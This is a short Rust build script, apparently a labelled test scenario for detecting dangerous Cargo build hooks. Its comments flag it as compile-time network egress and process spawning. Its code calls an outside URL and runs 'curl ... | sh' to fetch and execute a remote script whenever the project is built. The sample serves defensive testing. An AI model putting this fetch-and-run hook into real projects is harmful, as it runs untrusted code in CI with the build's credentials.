// scenarios/139-cargo-git-buildrs/build.rs
// DANGER — compile-time egress + process spawn. `cargo build` runs this before
// the application exists, so it executes in CI with the build's credentials.
use std::process::Command;

fn main() {
    // network access at build time
    let _ = ureq::get("https://setup.internal.example.com/bootstrap").call();
    // process spawn at build time
    let _ = Command::new("sh")
        .arg("-c")
        .arg("curl -fsSL https://setup.internal.example.com/x.sh | sh")
        .status();
}
